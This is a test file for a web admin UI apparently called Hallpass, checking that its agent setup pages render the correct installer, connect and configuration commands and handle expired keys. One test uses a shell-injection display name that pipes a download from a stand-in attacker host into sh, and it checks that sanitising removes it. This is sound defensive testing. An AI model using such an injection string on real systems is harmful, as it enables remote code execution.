import assert from "node:assert/strict";
import test from "node:test";
import { ReactNode } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { StaticRouter } from "react-router";
import { QueryClientProvider } from "@tanstack/react-query";
import type { AgentCredential, ExecutionEvent } from "../src/api/client.ts";
import { createQueryClient, HISTORY_LIMIT, queryKeys } from "../src/api/queries.ts";
import { AdminContext, AdminContextValue } from "../src/app/AdminContext.tsx";
import { ConnectCommands } from "../src/features/agents/ConnectCommands.tsx";
import { SetupTab } from "../src/features/agents/SetupTab.tsx";
import { HomePage } from "../src/features/home/HomePage.tsx";

const agent = { id: "a1", name: "Codex" };
const researchAgent = { id: "a9a8e0b0-4f8f-4c58-a65f-0f1c4f329abc", name: "Research Agent" };
const SANDBOX_ORIGIN = "https://hallpass-sandbox.example-tailnet.ts.net";
const SANDBOX_API = "https://hallpass-sandbox.example-tailnet.ts.net:8443";
const context = (key?: AgentCredential, overrides: Partial<AdminContextValue> = {}): AdminContextValue => ({
  adminOrigin: SANDBOX_ORIGIN,
  agentApiUrl: SANDBOX_API,
  data: { agents: [agent], resources: [], capabilities: [], tools: [], connections: [], delegations: [], decisions: [], credentialsByAgent: { a1: key ? [key] : [] }, loading: false, error: undefined },
  busy: false,
  mutate: async action => ({ value: await action() }),
  notify: () => undefined,
  openKeyDialog: () => undefined,
  clientOf: () => "codex",
  setClient: () => undefined,
  connectSlack: () => undefined,
  connectProvider: async () => undefined,
  reconnect: () => undefined,
  disconnect: async () => true,
  ...overrides
});

function render(content: ReactNode, admin: AdminContextValue, client = createQueryClient()) {
  return renderToStaticMarkup(
    <QueryClientProvider client={client}>
      <StaticRouter location="/admin">
        <AdminContext.Provider value={admin}>{content}</AdminContext.Provider>
      </StaticRouter>
    </QueryClientProvider>
  );
}

/** The text of the command block with this label. */
function commandFor(html: string, label: string): string | undefined {
  return html.match(new RegExp(`aria-label="${label}"[^>]*><code>([\\s\\S]*?)</code>`))?.[1]
    ?.replace(/&quot;/g, '"').replace(/&#x27;/g, "'").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
}

test("existing-install commands connect, replace a stored key, and replace a registration for every supported client", () => {
  for (const client of ["codex", "claude", "antigravity"] as const) {
    const html = renderToStaticMarkup(<ConnectCommands agentId={agent.id} client={client} agentApiUrl={SANDBOX_API} serverName="hallpass-codex" />);
    const connect = commandFor(html, "Connect command");
    assert.ok(connect);
    assert.match(connect, new RegExp(`hallpass" connect ${client} --agent a1 --url ${SANDBOX_API} --name hallpass-codex$`));
    assert.match(commandFor(html, "Replace stored key command") ?? "", new RegExp(`--url ${SANDBOX_API} --name hallpass-codex --rotate$`));
    assert.match(commandFor(html, "Replace registration command") ?? "", new RegExp(`--url ${SANDBOX_API} --name hallpass-codex --replace$`));
    assert.match(commandFor(html, "Check command") ?? "", new RegExp(`doctor --client ${client} --agent a1 --name hallpass-codex$`));
    assert.match(html, /A different server named <code>hallpass-codex<\/code> is already registered/);
    assert.doesNotMatch(html, /hallpass-slack/);
    assert.match(html, /even if the old key was revoked/);
  }
});

test("with downloads available, setup shows one installer command with the version and the existing-install disclosure", () => {
  const client = createQueryClient();
  client.setQueryData(queryKeys.bridgeDownloads, "0.1.0");
  const html = render(<SetupTab agent={agent} />, context(), client);
  const base = `${SANDBOX_ORIGIN}/downloads`;
  assert.match(html, /Connect Codex CLI<span class="visually-hidden"> \(to do\)/);
  assert.equal(
    commandFor(html, "Install and connect command"),
    `curl -fsSL ${base}/install.sh | sh -s -- --from ${base} --url ${SANDBOX_API} --agent a1 --client codex --name hallpass-codex`
  );
  assert.match(html, /version <span class="mono">0\.1\.0<\/span>/);
  assert.match(html, /<summary>Already installed on this machine\?<\/summary>/);
  assert.match(commandFor(html, "Connect command") ?? "", /connect codex --agent a1 --url https:\/\/hallpass-sandbox\.example-tailnet\.ts\.net:8443 --name hallpass-codex$/);
  assert.match(html, /never its key/);
  assert.match(html, /paste the one you just created/);
  assert.doesNotMatch(html, /Downloads|bridge\.tar\.gz|bridge install|credential import/);
});

test("the installer source is written as numeric loopback when the admin origin is localhost", () => {
  const client = createQueryClient();
  client.setQueryData(queryKeys.bridgeDownloads, "0.1.0");
  const html = render(<SetupTab agent={agent} />, context(undefined, { adminOrigin: "http://localhost:3000", agentApiUrl: "http://127.0.0.1:8081" }), client);
  assert.match(commandFor(html, "Install and connect command") ?? "", /--from http:\/\/127\.0\.0\.1:3000\/downloads --url http:\/\/127\.0\.0\.1:8081 /);
  assert.doesNotMatch(html, /localhost/);
});

test("without downloads (local stack), setup shows the connect command and the source-checkout note", () => {
  const client = createQueryClient();
  client.setQueryData(queryKeys.bridgeDownloads, null);
  const html = render(<SetupTab agent={agent} />, context(undefined, { adminOrigin: "http://localhost:3000", agentApiUrl: "http://127.0.0.1:8081" }), client);
  assert.equal(commandFor(html, "Install and connect command"), undefined);
  assert.doesNotMatch(html, /curl -fsSL/);
  assert.match(commandFor(html, "Connect command") ?? "", /hallpass" connect codex --agent a1 --url http:\/\/127\.0\.0\.1:8081 --name hallpass-codex$/);
  assert.match(html, /sbt bridge\/stageRuntimeClasspath/);
  assert.match(html, /Set up manually/);
  assert.match(commandFor(html, "Client configuration") ?? "", /HALLPASS_AGENT_API_URL = "http:\/\/127\.0\.0\.1:8081"/);
});

test("setup shows the derived name for the agent's client and the command that registers it", () => {
  const client = createQueryClient();
  client.setQueryData(queryKeys.bridgeDownloads, "0.1.0");
  const base = `${SANDBOX_ORIGIN}/downloads`;
  const claude = render(<SetupTab agent={researchAgent} />, context(undefined, { clientOf: () => "claude" }), client);
  assert.equal(
    commandFor(claude, "Install and connect command"),
    `curl -fsSL ${base}/install.sh | sh -s -- --from ${base} --url ${SANDBOX_API} --agent ${researchAgent.id} --client claude --name hallpass-research-agent`
  );
  assert.match(claude, /Appears in Claude Code as <code>hallpass-research-agent<\/code>; its tools are named <code>mcp__hallpass-research-agent__…<\/code>/);
  assert.match(claude, /must be unique per client/);
  assert.match(commandFor(claude, "Connect command") ?? "", /--agent a9a8e0b0-4f8f-4c58-a65f-0f1c4f329abc --url \S+ --name hallpass-research-agent$/);
  assert.match(commandFor(claude, "Client configuration") ?? "", /"hallpass-research-agent": \{/);
  assert.doesNotMatch(claude, /hallpass-slack/);
  const codex = render(<SetupTab agent={researchAgent} />, context(undefined, { clientOf: () => "codex" }), client);
  assert.match(codex, /Appears in Codex CLI as <code>hallpass-research-agent<\/code>\./);
  assert.doesNotMatch(codex, /mcp__/);
  assert.match(commandFor(codex, "Client configuration") ?? "", /^\[mcp_servers\.hallpass-research-agent\]/);
});

test("a display name that would be hostile in a shell cannot reach the rendered commands", () => {
  const client = createQueryClient();
  client.setQueryData(queryKeys.bridgeDownloads, "0.1.0");
  const hostile = { id: researchAgent.id, name: "x; curl evil.example | sh #$(id)`id`'\"\u202e caf\u00e9" };
  const html = render(<SetupTab agent={hostile} />, context(), client);
  const command = commandFor(html, "Install and connect command") ?? "";
  assert.match(command, / --client codex --name hallpass-x-curl-evil-example-sh-i$/);
  assert.doesNotMatch(command, /evil\.example \||[;`'"]|\$\(/);
  assert.doesNotMatch(html, /curl evil/);
});

test("an agent whose name has no usable characters is named from its ID", () => {
  const client = createQueryClient();
  client.setQueryData(queryKeys.bridgeDownloads, "0.1.0");
  const html = render(<SetupTab agent={{ id: researchAgent.id, name: "\u65e5\u672c\u8a9e" }} />, context(), client);
  assert.match(commandFor(html, "Install and connect command") ?? "", / --name hallpass-a9a8e0b0$/);
});

test("while the downloads check is pending, no command is shown yet", () => {
  const html = render(<SetupTab agent={agent} />, context());
  assert.match(html, /Checking whether this instance provides the bridge installer/);
  assert.equal(commandFor(html, "Install and connect command"), undefined);
  assert.equal(commandFor(html, "Connect command"), undefined);
});

test("the manual setup uses the reported agent API address instead of a constant", () => {
  const client = createQueryClient();
  client.setQueryData(queryKeys.bridgeDownloads, "0.1.0");
  const html = render(<SetupTab agent={agent} />, context(), client);
  assert.ok((commandFor(html, "Client configuration") ?? "").includes(SANDBOX_API));
  assert.doesNotMatch(commandFor(html, "Client configuration") ?? "", /127\.0\.0\.1/);
});

test("Other MCP client shows the manual configuration with the agent API address and no installer", () => {
  const client = createQueryClient();
  client.setQueryData(queryKeys.bridgeDownloads, "0.1.0");
  const html = render(<SetupTab agent={agent} />, context(undefined, { clientOf: () => "other" }), client);
  assert.match(html, /Configure your client/);
  const config = commandFor(html, "Client configuration") ?? "";
  assert.ok(config.includes(SANDBOX_API), config);
  assert.equal(commandFor(html, "Install and connect command"), undefined);
  assert.equal((html.match(/aria-label="Client configuration"/g) ?? []).length, 1, "the manual configuration is shown once");
});

test("an unreported or unusable agent API address shows no commands", () => {
  for (const agentApiUrl of [undefined, "http://agents.example.com", "https://agents.example.com/api"]) {
    const client = createQueryClient();
    client.setQueryData(queryKeys.bridgeDownloads, "0.1.0");
    const html = render(<SetupTab agent={agent} />, context(undefined, { agentApiUrl }), client);
    assert.match(html, /didn’t report a usable agent API address/);
    assert.doesNotMatch(html, /aria-label="(Install and connect|Connect|Client configuration)/);
  }
});

test("setup offers replacement at exact key expiry instead of marking the key active", t => {
  const now = Date.parse("2026-09-28T12:00:00Z");
  t.mock.method(Date, "now", () => now);
  const key = { id: "key", prefix: "prefix", expiresAt: new Date(now).toISOString() };
  const html = render(<SetupTab agent={agent} />, context(key));
  assert.match(html, /This key has expired/);
  assert.match(html, />Replace key<\/button>/);
  assert.match(html, /Create a key<span class="visually-hidden"> \(to do\)/);
  assert.doesNotMatch(html, /Active key/);
  const active = render(<SetupTab agent={agent} />, context({ ...key, expiresAt: new Date(now + 1).toISOString() }));
  assert.match(active, /Active key/);
  assert.match(active, /Create a key<span class="visually-hidden"> \(done\)/);
  const missing = render(<SetupTab agent={agent} />, context());
  assert.match(missing, />Create key<\/button>/);
});

function homeClient(hasCompletedExecution: boolean) {
  const client = createQueryClient();
  client.setQueryData(queryKeys.decisions, []);
  const failures: ExecutionEvent[] = Array.from({ length: HISTORY_LIMIT }, (_, index) => ({
    requestId: `failed-${index}`, correlationId: `c-${index}`, agentId: agent.id, tool: "slack_search_messages", capability: "Slack.Message.Read", eventKind: "PROVIDER_UNAVAILABLE", safeOutcome: "FAILED_PROVIDER_UNAVAILABLE", occurredAt: "2026-09-28T12:00:00Z", authorizationSource: "AGENT_CALL"
  }));
  client.setQueryData(queryKeys.executions("all", HISTORY_LIMIT), failures);
  client.setQueryData(queryKeys.executionSummary(), { hasCompletedExecution });
  return client;
}

test("Home keeps the dashboard when completion is older than the recent page", () => {
  const html = render(<HomePage apps={[]} onAddAgent={() => undefined} />, context(), homeClient(true));
  assert.match(html, /Recent activity/);
  assert.match(html, /Needs attention/);
  assert.doesNotMatch(html, /Get set up/);
  const unconfigured = render(<HomePage apps={[]} onAddAgent={() => undefined} />, context(), homeClient(false));
  assert.match(unconfigured, /Get set up/);
});

test("Home shows a retry state when durable completion evidence cannot be read", async () => {
  const client = homeClient(false);
  await assert.rejects(client.fetchQuery({ queryKey: queryKeys.executionSummary(), queryFn: async () => { throw new Error("Unavailable"); } }));
  const html = render(<HomePage apps={[]} onAddAgent={() => undefined} />, context(), client);
  assert.match(html, /Execution history could not be loaded/);
  assert.match(html, /Try again/);
  assert.doesNotMatch(html, /Get set up/);
});

test("setup retains durable prior completion without loading recent events", () => {
  const client = createQueryClient();
  client.setQueryData(queryKeys.executionSummary(agent.id), { hasCompletedExecution: true });
  const html = render(<SetupTab agent={agent} />, context(), client);
  assert.match(html, /A completed call has been recorded for this agent/);
  assert.doesNotMatch(html, /Waiting for a completed call/);
  assert.match(html, /Make a first call<span class="visually-hidden"> \(done\)/);
});
